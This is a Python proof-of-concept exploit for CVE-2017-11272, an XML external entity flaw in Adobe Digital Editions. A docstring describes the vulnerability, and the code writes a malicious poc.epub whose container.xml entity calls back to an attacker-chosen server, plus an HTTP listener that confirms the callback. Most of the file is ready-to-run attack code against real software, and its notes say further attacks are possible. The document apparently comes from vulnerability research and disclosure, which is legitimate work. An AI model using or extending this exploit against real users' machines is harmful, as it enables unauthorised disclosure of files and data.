#!/usr/local/bin/python
"""
Adobe Digital Editions ePub Container File External Entity Processing Information Disclosure Vulnerability
Found by: Steven Seeley of Source Incite
IDs: SRC-2017-0006, CVE-2017-11272

Summary:
========

This vulnerability allows remote attackers to disclose sensitive information on vulnerable installations of Adobe Digital Editions. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists when processing ePub Container Files. Due to the improper restriction of XML External Entity (XXE) reference, a specially crafted ePub file can cause the XML parser to access the contents of this URI and embed these contents back into the XML document for further processing. An attacker can leverage this vulnerability to disclose sensitive information under the context of the current process.

Notes:
======

- This poc simply creates a poc.epub file that calls back to the web server and nothing more. Further attacks are possible.
- Tested on DigitalEditions.exe (98ece993dcdcfdab4684e276beef917cafab363b) v4.5.2.0

Example:
========

saturn:SRC-2017-0006 mr_me$ ./poc.py 172.16.175.1
(+) starting xxe server...
(+) launching xxe attack...
(!) triggered xxe attack!

References:
===========

- http://www.idpf.org/epub/31/spec/epub-ocf.html#sec-container-metainf-container.xml
- https://helpx.adobe.com/security/products/Digital-Editions/apsb17-27.html
"""

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import threading
import sys
import time
import zipfile
from cStringIO import StringIO

class xxe(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        return

    def do_GET(self):
        print "(!) triggered xxe attack!"
        self.send_response(200)
        self.end_headers()
        message =  threading.currentThread().getName()
        self.wfile.write(message)
        self.wfile.write('\n')
        return

def build_poc(server):
    xxe = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s:9090/">]>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
    <rootfiles>
        <rootfile full-path="content.opf" media-type="application/oebps-package+xml">&xxe;</rootfile>
    </rootfiles>
</container>""" % server

    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    zipinfo = zipfile.ZipInfo("META-INF/container.xml")
    zipinfo.external_attr = 0777 << 16L
    z.writestr(zipinfo, xxe)
    z.close()
    epub = open('poc.epub','wb')
    epub.write(f.getvalue())
    epub.close()

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print "(+) usage: %s <xxe server>" % sys.argv[0]
        print "(+) eg: %s 172.16.175.1" % sys.argv[0]
        sys.exit(1)
    x = sys.argv[1] 
    build_poc(x)
    try:
        server = HTTPServer(('0.0.0.0', 9090), xxe)
        print '(+) starting xxe server...'
        
        # we just handle a single request in a thread so we can make the remote xxe attack
        http = threading.Thread(target=server.handle_request).start()
        print "(+) launching xxe attack..."
    except KeyboardInterrupt:
        print '(+) shutting down the web server'
        server.socket.close()